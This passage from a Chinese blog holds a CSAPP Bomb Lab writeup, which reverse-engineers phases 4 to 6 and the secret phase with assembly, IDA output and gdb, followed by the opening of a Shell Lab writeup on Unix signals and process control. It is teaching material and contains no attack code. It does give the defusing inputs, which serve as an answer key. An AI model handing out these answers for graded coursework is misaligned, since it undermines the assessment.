<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>没有什么栈的布局，就是些寄存器之间的计算，我们一个一个模拟一下：</p>
<p>（初始化：rdi = ?, rsi = 0, rdx = 0xe）</p>
<ol>
<li>eax = edx,  eax = 0xe</li>
<li>eax -= esi, eax = 0xe</li>
<li>ecx = eax,  ecx = 0xe</li>
<li>ecx &gt;&gt;= 0x1f, ecx &gt;&gt;= 31, ecx = 0（注意是逻辑右移）</li>
<li>eax += ecx, eax = 0xe</li>
<li>eax &gt;&gt;= 1, eax = 0x7（注意是算术右移，且只有一个参数时默认右移1位）</li>
<li>ecx = rax + rsi * 1 = 0x7 + 0 = 0x7</li>
</ol>
<p>然后我们分析下后面跳转的流程：</p>
<ul>
<li>如果%edi &lt;= %ecx，就会跳转到0x400ff2去。</li>
<li>跳转完再来一个cmp，如果%edi &gt;= %ecx，就可以调到0x401007结束函数了。</li>
</ul>
<p>所以只需要%ecx和%edi一样大就可以了，所以rdi直接等于7就可以了。</p>
<p>所以我们直接输入7跟0就可以了。</p>
<p>所以最后复习下这些奇妙的汇编指令，以免我又忘了：</p>
<ul>
<li><code>imul src, dest</code> 乘法</li>
<li><code>sal  src, dest</code> 算术左移</li>
<li><code>sar  src, dest</code> 算术右移</li>
<li><code>shl  src, dest</code> 逻辑左移</li>
<li><code>shr  src, dest</code> 逻辑右移</li>
</ul>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase 5"></a>phase 5</h2><h3 id="汇编-4"><a href="#汇编-4" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>这个函数的stack frame是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phase 5</span><br><span class="line">0x00 (rsp)</span><br><span class="line">0x08 canary</span><br><span class="line">0x10 rdi</span><br><span class="line">0x18</span><br><span class="line">0x20 rsp</span><br></pre></td></tr></table></figure>
<p>同样有奇妙地址，我们查一查：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase5_str.png">
<p>这个字符串打印出来之所以这样，是因为它最后一位不是<code>\x00</code>，所以就连续着把紧连着的下一个字符串也输出出来了。</p>
<p>最开始在call出<code>string_length</code>之前的这部分是用来初始化canary的。不用管。</p>
<p>字符串长度必须为6，才能跳转，不然会踩雷。</p>
<p>接下来从0x40108b开始，就是一个6次的循环，rax充当循环的counter，很容易看出来。</p>
<p>如果我们过完这个循环，最终要满足的是这个条件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br></pre></td></tr></table></figure><br>所以我们要做的，就是在跑完上面这次循环之后，让<code>rsp + 0x10</code>开始的字符串跟<code>flyers</code>一毛一样。</p>
<p>这段代码粘下来集中看一看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>开始模拟：</p>
<p>（初始化rbx指向的是最开始的rdi，也就是字符串的开始）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ecx &#x3D; str[i]</span><br><span class="line">*rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">rdx &#x3D; *rsp &#x3D; cl (lower 4 digits of str[i])</span><br><span class="line">edx &amp;&#x3D; 0xf</span><br><span class="line">edx &#x3D; array3449[cl]</span><br><span class="line">*(rsp + rax + 0x10) &#x3D; dl (lower 4 digits of array3449[cl])</span><br></pre></td></tr></table></figure>
<p>最后的这个<code>(rsp + rax + 0x10)</code>看上去不认识，但是参照下上面的栈结构，其实表示的就是字符串的第i位。</p>
<p>所以我们只需要去注意输入的6个字符中，每个字符的低4位在<code>array3449</code>中索引出来的值，这些值就会一个一个的，填到以<code>rsp + 0x10</code>为开始的字符串中。</p>
<p>手动数一数下标，就可以发现，要对应弄出<code>flyers</code>，我们依次需要下标是<code>9 15 14 5 6 7</code>。</p>
<p>所以我们只需要翻翻ASCII表，找到低4位是这些的字符，拼到一起就可以了。</p>
<p>我最终的答案是<code>ionefg</code>。答案不唯一。</p>
<h3 id="IDA-4"><a href="#IDA-4" class="headerlink" title="IDA"></a>IDA</h3><img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase5(IDA).png">
<p>主要是这句代码太具有迷惑性：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>正确的解读是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3[i] = array_3449[a1[i] &amp; <span class="number">0xF</span>];</span><br></pre></td></tr></table></figure>
<p>在C里面，一个char所占据的大小恰好就是一个byte，所以<code>_BYTE</code>可以直接看成<code>char</code>。</p>
<p>这里我之所以迷糊，是因为IDA Pro反汇编说<code>a1</code>的类型是<code>int64</code>，然而事实上<code>a1</code>就是个字符串。</p>
<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase 6"></a>phase 6</h2><p>最后一关，太复杂了！那我们就不分析汇编，直接上手看IDA Pro弄出来的代码。</p>
<p>其实弄出来的代码也不好看懂，一不小心也很容易晕！这里重新做一下记录。</p>
<h3 id="IDA-5"><a href="#IDA-5" class="headerlink" title="IDA"></a>IDA</h3><p>反汇编出来的代码长这样，非常长，变量非常多。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_6</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v1; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rsi</span></span><br><span class="line">  _QWORD *v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v15[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+18h] [rbp-60h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+28h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+50h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v1 = v15;</span><br><span class="line">  read_six_numbers(a1, v15);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*v1 - <span class="number">1</span>) &gt; <span class="number">5</span> )</span><br><span class="line">      explode_bomb(a1, v15);</span><br><span class="line">    <span class="keyword">if</span> ( ++v2 == <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v1 == v15[v3] )</span><br><span class="line">        explode_bomb(a1, v15);</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt;= <span class="number">5</span> );</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)v15;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v4 = <span class="number">7</span> - *(_DWORD *)v4;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != &amp;v16 );</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v15[v5 / <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">1</span>;</span><br><span class="line">      v6 = &amp;node1;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_QWORD *)v6[<span class="number">1</span>];</span><br><span class="line">        ++v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != v8 );</span><br><span class="line">    &#125;</span><br><span class="line">    *(__int64 *)((<span class="keyword">char</span> *)&amp;v17 + <span class="number">2</span> * v5) = (__int64)v6;</span><br><span class="line">    v5 += <span class="number">4L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">24</span> );</span><br><span class="line">  v9 = v17;</span><br><span class="line">  v10 = &amp;v18;</span><br><span class="line">  <span class="keyword">for</span> ( i = v17; ; i = v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = *(_QWORD *)v10;</span><br><span class="line">    *(_QWORD *)(i + <span class="number">8</span>) = *(_QWORD *)v10;</span><br><span class="line">    v10 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 == &amp;v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(v12 + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v13 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = **(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(v9 + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v9 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)result )</span><br><span class="line">      explode_bomb(a1, &amp;v19);</span><br><span class="line">    v9 = *(_QWORD *)(v9 + <span class="number">8</span>);</span><br><span class="line">    --v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v13 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们画一画这个函数的栈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00 rbp</span><br><span class="line">0x08</span><br><span class="line">0x10</span><br><span class="line">0x18</span><br><span class="line">0x20</span><br><span class="line">0x28 char v19[0x28] 0ll</span><br><span class="line">0x30               &amp;node[v15[5]]</span><br><span class="line">0x38               &amp;node[v15[4]]</span><br><span class="line">0x40               &amp;node[v15[3]]</span><br><span class="line">0x48               &amp;node[v15[2]]</span><br><span class="line">0x50 char v18      &amp;node[v15[1]]  &lt;- v10</span><br><span class="line">0x58 long long v17 &amp;node[v15[0]]  v9</span><br><span class="line">0x60 char v16</span><br><span class="line">0x64 v15[5]</span><br><span class="line">0x68 v15[4]</span><br><span class="line">0x6c v15[3]</span><br><span class="line">0x70 v15[2]</span><br><span class="line">0x74 v15[1]</span><br><span class="line">0x78 v15[0]</span><br></pre></td></tr></table></figure>
<p>这个栈的图片非常非常重要，首先先保证不会乱，因为后面还有跳出栈外的过程。</p>
<p>还有，在分析的过程中，时刻注意每一个变量到底是值，还是指针！千万不能错！</p>
<p>一步一步分析，不要急，一定要慢慢来：</p>
<p>最开始，从<code>v15</code>开始，读入6个<code>int</code>类型的整数，存在栈上。（<code>v15</code>是个指针）</p>
<p>第一个是嵌套循环，<code>v1</code>是当前遍历到的元素的指针，<code>v2</code>表示第几个元素（从1开始数），<code>v3</code>是循环变量。</p>
<p>每次遍历<code>v1</code>，都必须保证<code>1 &lt;= *v1 &lt;= 6</code>，关于强转unsigned int的知识点，在最后有总结。然后内层循环表示后面的元素都得跟前面的不一样，意思就是这6个数各不相同。</p>
<p>第二个是单个do-while循环。它做的就是把这6个数都运算一遍，把<code>x</code>变成了<code>7-x</code>，更改了这6个数。</p>
<p>第三个开始烧脑了！<code>v8</code>是循环中被遍历到的值，根据<code>v8</code>的数值大小，分别执行若干次从<code>&amp;node1</code>开始的<code>v8 - 1</code>次地址跳转，最终把栈上原来数组的值重新写为跳转到最后的地址。</p>
<p>这里注意一下，<code>v6 = (_QWORD *)v6[1];</code>这句代码是伏笔！（为什么这个值可以强转为地址呢？）</p>
<p>我们点进<code>node1</code>，发现在data段，后面刚好延伸到<code>node6</code>结束，这是什么意思？</p>
<p>不懂，我们看到下一个代码部分：</p>
<p>一个for循环，从<code>v17</code>即<code>rbp - 0x58</code>开始，每次循环结束会跳转到<code>v10</code>的值。之所以可以直接迭代为<code>v10</code>的值，是因为这个数组在第三次操作的时候已经变成了指针数组了！</p>
<p>接下来又是一句意味深长的代码：<code>*(_QWORD *)(i + 8) = *(_QWORD *)v10;</code></p>
<p>我们在IDA开始乱了，用gdb看一看有没有线索，毕竟还没有查过那段<code>&amp;node1</code>的奇妙地址。结果非常的意外：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase6_node.png">
<p>不知为什么，每一个node元素，他的第三个数字，恰好跟下一个node的地址一模一样！</p>
<p>其实突破点就出来了：</p>
<p><strong>每一个node是一个struct类型！</strong></p>
<p><strong>node里面的第三个数字，代表着下一个元素的地址！</strong></p>
<p><strong>这就是链表的汇编！</strong></p>
<p>其他的数字是啥意思呢？第一个数字对应节点的值，第二个数字是id，第三个数字是地址，然后怎么有空出来的0？</p>
<p>不是空出来的0，而是因为地址就是64位的！</p>
<p>在这里，结构体内的元素顺序不同，所占用的空间也会不同，这个在CSAPP中有提到过内存对齐的概念！</p>
<p>那为什么上面的那个伏笔，对应的下标是1呢？</p>
<p>因为<code>v6</code>就是一个<code>QWORD</code>类型，而node里面的数字都是int，只有32位呀！</p>
<p>接下来就非常简单了，最后一个循环所代表的，就是确保最终的数值是降序排列的。</p>
<p>所以最终的排序是924 &gt; 691 &gt; 477 &gt; 443 &gt; 332 &gt; 168，即<code>3 4 5 6 1 2</code>。</p>
<p>别忘记了前面有一个<code>x = 7 - x;</code>，所以最终的答案就是<code>4 3 2 1 6 5</code>。</p>
<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret phase"></a>secret phase</h2><p><del>待补充，今天晚点再做了补上。（咕咕咕）</del></p>
<p>Jan 15 upd：来补上secret phase了！</p>
<h3 id="怎么进secret-phase"><a href="#怎么进secret-phase" class="headerlink" title="怎么进secret phase"></a>怎么进secret phase</h3><p><code>secret_phase</code>函数的入口其实在<code>phase_defused</code>里面。</p>
<p>懒得看汇编，直接用IDA Pro做了。<del>其实反汇编出来的跟看汇编也差不多</del></p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/phase_defused(IDA).png">
<p>这里看到一个<code>num_input_strings</code>，是个在bss段上的全局变量。同时，<code>sscanf</code>所读入的那个地址，也是在bss段上的，初始化都是0，不过可能会在函数执行的时候被修改。</p>
<p>那到底是什么时候被修改的？我们分别用gdb设断点看一看。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(num_input_strings).png">
<p>可以发现这个变量的意思就是记录现在是第几关。所以当第六关的时候就可以了。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(input_strings).png">
<p>可以发现是我们在打phase 4的时候，这个<code>input_strings + 240</code>所在的字符串就更改成了我们输入的内容。并且后面不会再更改。</p>
<p>所以我们只需要在第四阶段，在第三个位置上输入一个<code>DrEvil</code>，就可以在过完第六关之后触发了。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(IDA).png">
<p>要使这个<code>func7</code>返回2，并且输入的数字小于等于0x3e8 + 1，就可以通关了。</p>
<p>这里有一个<code>&amp;n1</code>，点进去看看，又是在data段，跟前面的<code>&amp;node1</code>很类似。并且，<code>n1</code>后面也紧跟着其他类似的东西，应该又是一个struct。</p>
<p>我们用gdb看一看：</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/secret_phase(n1).png">
<p>可以发现，每个结构体储存了两个地址，我们做下笔记：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n1(n21, n22)  36</span><br><span class="line">n21(n31, n32) 8</span><br><span class="line">n22(n33, n34) 50</span><br><span class="line">n32(n43, n44) 22</span><br><span class="line">n33(n45, n46) 45</span><br><span class="line">n31(n41, n42) 6</span><br><span class="line">n34(n47, n48) 107</span><br><span class="line">n45 40</span><br><span class="line">n41 1</span><br><span class="line">n47 99</span><br><span class="line">n44 35</span><br><span class="line">n42 7</span><br><span class="line">n43 20</span><br><span class="line">n46 47</span><br><span class="line">n48 1001</span><br></pre></td></tr></table></figure>
<p>这种一对二的关系，其实就是二叉树：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                n1</span><br><span class="line">      n21             n22</span><br><span class="line">  n31     n32     n33     n34</span><br><span class="line">n41 n42 n43 n44 n45 n46 n47 n48</span><br></pre></td></tr></table></figure>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/func7(IDA).png">
<p>想让<code>func7</code>为2，首先要落向左边，然后落向右边，然后返回0，这样就能构造出<code>2 * (2 * 0 + 1) = 2</code>了。</p>
<p>最后的返回0，也可以走左边再返回0，所以<code>n32</code>和<code>n43</code>的值都是没问题的，即我们有20跟22两个答案。</p>
<p>终于通关了！芜湖起飞！</p>
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/success.png">
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/success1.png">
<img data-src="http://qiniu.garen-wang.top/static/images/CSAPP-Bomb-Lab-Writeup/success2.png">
]]></content>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Shell Lab Writeup</title>
    <url>/2021/07/20/CSAPP-Shell-Lab-Writeup/</url>
    <content><![CDATA[<h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h2><h3 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h3><p>Signal是一种内核与进程之间交互的信息。诸如熟悉的Ctrl+C、Ctrl+Z等终止程序或休眠程序的实质都是发送相应的signal。Signal是异常控制流的其中一种，可以在本地异步运行。</p>
<p>贴一些可能见得多的signal：</p>
<ul>
<li><code>SIGABRT</code>: abort</li>
<li><code>SIGFPE</code>: floating point exception</li>
<li><code>SIGINT</code>: interrupt (when pressing <code>Ctrl+C</code>)</li>
<li><code>SIGSEGV</code>: segment violation (a.k.a. segment fault)</li>
<li><code>SIGTSTP</code>: stopped (when pressing <code>Ctrl+Z</code>)</li>
<li><code>SIGCHLD</code>: Terminated or stopped child</li>
</ul>
<a id="more"></a>
<h3 id="Relative-C-Functions"><a href="#Relative-C-Functions" class="headerlink" title="Relative C Functions"></a>Relative C Functions</h3><p>在命令行里面，如果要给一个进程（或进程组）添加信号，可以用<code>kill</code>。<code>kill</code>并不只是用来杀进程的，实际上是添加信号。</p>
<p>在C里面也有一个叫<code>kill</code>的函数，需要指定pid和信号，用法大体类似。这就是我们可以用C写shell的原因之一。</p>
<blockquote>
<p><code>kill</code>可以作用于一个进程上，也可以作用于一整个进程组上，具体区别在pid的值：</p>
<ul>
<li>当pid为正，则作用于单个进程</li>
<li>当pid为负，则作用于这个进程所在的进程组</li>
</ul>
</blockquote>
<p>相信见过像Vim等的一些按Ctrl+C退不出的程序，之所以退不出不是因为<code>SIGINT</code>无法发出，而是因为signal的handler是可以由我们来自定义的。</p>
<p>在C里面，我们可以通过调用<code>signal</code>函数，install一个signal的handler，覆盖原有的默认handler。signal大多数都能覆盖，除了<code>SIGKILL</code>跟<code>SIGSTOP</code>等。</p>
<p>signal handler需要自己去声明定义一个函数，可以形象地理解成比较底层的try-catch，catch相应的signal，执行handler里面的内容。</p>
<p>如果想要写shell，相信需要在程序里面创建进程，执行命令等等。相应的C函数也介绍一下：</p>
<ul>
<li><code>int fork()</code>: create a new process (child process). called once, return twice. return 0 in child process, return pid in parent process.</li>
<li><code>int execve(argv[0], argv, environ)</code>: load and run another program. called once, never return(if sucessfully executed).</li>
<li><code>void exit(int status)</code>: terminate the current process with status. Then it becomes a zombie process, waiting to be reaped by its parent.</li>
</ul>
<p>如果我们fork了一次，父子两个进程的执行速度是无法确定的，有时儿子快有时儿子慢，这就导致了一次运行的结果可能不同。形象地，我们可以理解成在这种无约束的异步进程中，进程之间会相互比赛，竞争运行速度<del>（卷起来了）</del>，我们称这种现象为race。</p>
<p>如果不想出现这种情况，需要显式地叫其中一个进程去等其他的进程，这种操作可以用<code>waitpid</code>来完成。</p>
<p>signal可以被屏蔽，即可以选择block掉指定类型的signal，以确保race不会在其中发生。分析可能发生的race是最复杂的部分。</p>
<h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>在这个lab里面我们需要实现一个小型的shell，名叫tsh（tiny shell），因为不用实现现代shell的功能，所以功能确实很朴素。</p>
<p>实验需要我们写的只有<code>tsh.c</code>一个文件，需要你定义若干个已经声明的函数。</p>
<p>在<code>tsh.c</code>中也温馨地提供了几个helper functions。</p>
<p>用户运行了shell之后，会在<code>stdin</code>等待用户的输入。用户的输入以空格为分隔，第一个称为name，后面则为参数。</p>
<p>如果name是built-in command，则直接在前台运行，运行完直接等待下一个输入。</p>
<p>如果name是一个binary executable，则新开一个进程（或者说是add a new job），在子进程中执行命令。</p>
<p>命令有前台后台运行之分，如果最后带有一个<code>&amp;</code>，则为后台运行，此时shell不用去等待job运行完毕，可以继续执行shell的功能。前台等待job完成的内容需要在<code>waitfg</code>函数之中完成。</p>
<p>这里有一个细节，因为我们的shell是一个程序，而默认我们创建的job会跟shell是同一个进程组，那么如果子进程被杀掉的话shell也会被杀掉，这不符合shell的性质，所以我们需要保证创建的子进程都跟shell自己处于不同的进程组。这部分是通过<code>setpgid(0, 0)</code>来完成的。</p>
<p>在子进程执行完成之后，子进程会变成一个zombie，不再会被执行，但会一直占着地方，它们需要被shell回收。相关的信号是<code>SIGCHLD</code>。这部分的工作是通过定义<code>SIGCHLD</code>的handler来完成的。</p>
